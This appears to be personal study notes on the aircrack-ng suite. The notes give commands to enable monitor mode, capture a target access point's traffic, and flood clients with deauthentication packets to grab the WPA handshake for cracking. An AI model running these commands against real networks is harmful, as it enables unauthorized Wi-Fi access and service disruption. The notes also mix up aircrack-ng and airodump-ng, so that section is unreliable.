### Using some of aircrack-ng suite's tools:
 - aircrack-ng, airodump-ng and airmon-ng, aireplay-ng


## airmon-ng(used to change interaces into monitor mode)
  - monitor mode: `sudo airmon-ng start wlan0` (assuming wlan0 is your interface's name)
  - the name will likely be: `wlan0mon`
  - kill processes using that network adapter: `airmon-ng check kill`

## airodump-ng(captures packets from an interface in monitor mode)
  - `sudo airodump-ng wlan0mon` 

 ## aircrack-ng(captures the hash of the passphrase from the 4-way-handshake)
  - Important switches
  ```sh
  -b (to specify the bssid)
  -e (to specify the essid)
  -w (to specify a wordlist)
  -j (create an HCCAPX file so that hashcat can crack the password)
  -c (specifies the channel the access point is operating)
  ```
  - use example: `sudo airodump-ng -b 00:11:22:33:44:55 -c 6 -w capture wlan0mon`

  - `-b`: The MAC address of the target access point.
  - `-c 6`: The channel on which the access point operates.
  - `-w capture`: The prefix of the filename to save the capture.
 

## aireplay-ng(force the clients to deauth to speed up the process of getting the passwd hash)
  
  ### deauthenticate specific client:
  - example use: `sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon`

  - `--deauth 10`: Sends 10 deauthentication packets.
  - `-a 00:11:22:33:44:55`: The MAC address of the access point.
  - `-c AA:BB:CC:DD:EE:FF`: The MAC address of the client to deauthenticate.

  ### deauthenticate all clients:
  - example use: `sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon`

  - `--deauth 0`: Sends deauthentication packets continuously (0 means infinite).
  - `-a 00:11:22:33:44:55`: The MAC address of the target access point.
  - `wlan0mon`: Your wireless interface in monitor mode.
